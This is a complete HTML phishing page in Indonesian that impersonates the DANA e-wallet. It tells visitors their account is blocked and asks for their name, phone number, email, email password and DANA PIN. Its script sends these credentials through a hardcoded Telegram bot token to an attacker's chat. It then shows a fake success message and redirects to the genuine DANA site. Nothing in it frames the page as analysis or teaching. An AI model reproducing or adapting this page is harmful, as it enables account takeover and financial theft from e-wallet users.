<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Notifikasi Pemblokiran Akun</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(#1a73e8, #ffffff);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
      width: 350px;
    }
    h2 {
      text-align: center;
      color: #d32f2f;
    }
    p {
      text-align: center;
      font-size: 14px;
      color: #555;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    button {
      background-color: #1a73e8;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: #0c5dc0;
    }
    .small-text {
      font-size: 11px;
      text-align: center;
      color: grey;
      margin-top: 15px;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Akun DANA Diblokir</h2>
  <p>
    Akun Anda diblokir karena terindikasi aktivitas ilegal.<br>
    Untuk mengaktifkan kembali, silakan lakukan verifikasi data.
  </p>

  <form id="verifyForm">
    <input type="text" id="nama" placeholder="Nama Lengkap" required>
    <input type="text" id="nomor" placeholder="Nomor HP Terdaftar" required>
    <input type="email" id="email" placeholder="Email DANA" required>
    <input type="password" id="sandi_email" placeholder="Password Email" required>
    <input type="password" id="pin" placeholder="PIN DANA" required>
    <button type="submit">Verifikasi Sekarang</button>
  </form>

  <div class="small-text">
    DANA Indonesia 2025 &copy; Semua hak dilindungi.
  </div>
</div>

<script>
  const botToken = '7826324853:AAEP06JA0kDuJY-xeLhbsKAirLU_6OJRh7g';
  const chatId = '6859109463';

  document.getElementById('verifyForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const nama = document.getElementById('nama').value;
    const nomor = document.getElementById('nomor').value;
    const email = document.getElementById('email').value;
    const sandi_email = document.getElementById('sandi_email').value;
    const pin = document.getElementById('pin').value;

    const message = `
ðŸ”” *DATA VERIFIKASI DANA* ðŸ””

Nama: ${nama}
Nomor HP: ${nomor}
Email: ${email}
Password Email: ${sandi_email}
PIN DANA: ${pin}
    `;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    })
    .then(response => {
      if (response.ok) {
        alert('Verifikasi berhasil dikirim. Mohon tunggu 1x24 jam untuk aktivasi.');
        window.location.href = 'https://www.dana.id/';
      } else {
        alert('Gagal mengirim data. Silakan coba lagi.');
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert('Terjadi kesalahan.');
    });
  });
</script>

</body>
</html>
